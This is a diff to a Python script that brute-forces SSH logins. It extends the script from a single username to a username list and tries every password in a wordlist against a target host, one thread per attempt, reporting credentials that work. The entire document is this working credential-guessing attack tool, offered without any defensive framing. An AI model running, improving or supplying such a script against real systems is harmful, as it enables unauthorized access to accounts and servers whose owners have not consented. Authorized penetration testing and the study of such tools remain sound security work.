@@ -16,7 +16,8 @@ import time
 
 stop_flag = 0
 
-def ssh_connect(password):
+
+def ssh_connect(username, password):
     global stop_flag
     # global host
     # global username
@@ -28,31 +29,46 @@ def ssh_connect(password):
         ssh.connect(host, port=22, username=username, password=password)
         stop_flag = 1
         # using termcolor.colored(First bracket is for data to change color), second for color to use)
-        print(termcolor.colored(('[+] Found Password: ' + password + ' , For Account: ' + username), 'green'))
+        print(termcolor.colored(
+            ('[+] Found Password: ' + password + ' , For Account: ' + username), 'green'))
     # The paramiko.AuthenticationException is returned when the login credentials
     # Are invalid or not authenticated
     except:
-        print(termcolor.colored(('[-] Incorrect Credential: ' + password), 'red'))
+        print(termcolor.colored(
+            ('[-] Incorrect Credential: ' + password + ' , For Account: ' + username), 'red'))
     # Paramiko close() function closes the connections
     ssh.close()
 
+
 host = input('[+] Target Address: ')
-username = input('[+] SSH Username: ')
+username_list = input('[+] SSH Username File: ')
 input_file = input('[+] Password File: ')
 print('\n')
 
-if not os.path.exists(input_file):
-    print('[!!] That file/path does not exist')
+if not os.path.exists(username_list):
+    print(f'[!!] That {username_list} does not exist')
     sys.exit(1)
 
-print(termcolor.colored(('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + '* * *'), 'blue'))
+if not os.path.exists(input_file):
+    print(f'[!!] That {input_file} does not exist')
+    sys.exit(1)
 
-with open(input_file, 'r') as file:
-    for line in file.readlines():
-        if stop_flag == 1:
-            t.join()
-            exit()
-        password = line.strip()
-        t = threading.Thread(target=ssh_connect, args=(password,))
-        t.start()
-        time.sleep(1.5)
+print(termcolor.colored(
+    ('* * * Starting Threaded SSH Bruteforce On ' + host + '* * *'), 'blue'))
+
+with open(input_file, 'r') as pass_file, open(username_list, 'r') as user_file:
+
+    the_users = user_file.readlines()
+    the_pass = pass_file.readlines()
+
+    for user in the_users:
+        usernames = user.strip()
+        for line in the_pass:
+            if stop_flag == 1:
+                t.join()
+                exit()
+            password = line.strip()
+            t = threading.Thread(target=ssh_connect,
+                                 args=(usernames, password,))
+            t.start()
+            time.sleep(1.5)
